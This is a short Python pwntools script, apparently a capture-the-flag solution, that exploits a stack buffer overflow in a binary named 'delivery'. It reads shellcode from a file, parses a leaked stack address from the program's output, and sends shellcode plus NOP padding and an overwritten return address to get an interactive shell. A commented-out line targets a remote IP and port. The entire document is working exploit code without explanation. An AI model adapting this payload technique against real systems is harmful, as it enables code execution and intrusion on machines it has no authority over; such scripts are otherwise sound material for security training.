#!/usr/bin/python3
import sys
import struct
from pwn import *

shell = b''
with open('shell', 'rb') as f:
    shell = f.read()
context.update(arch='i386', os='linux')
context.terminal = 'bash'
# start connection and get address
# io = remote('18.222.0.249',1337)
io = process('./delivery')
gdb.attach(io, gdbscript='continue')
out = io.recvuntil(b'Package:')
print(out)
addr = out.splitlines()[-2].decode('utf-8').split(':')[-1]
payload = shell + b'\x90' * 17 + struct.pack('l',int(addr,16))+ b'RRRR'
print(addr)
print(struct.pack('l',int(addr,16)))
io.clean()
io.sendline(payload)
io.interactive()
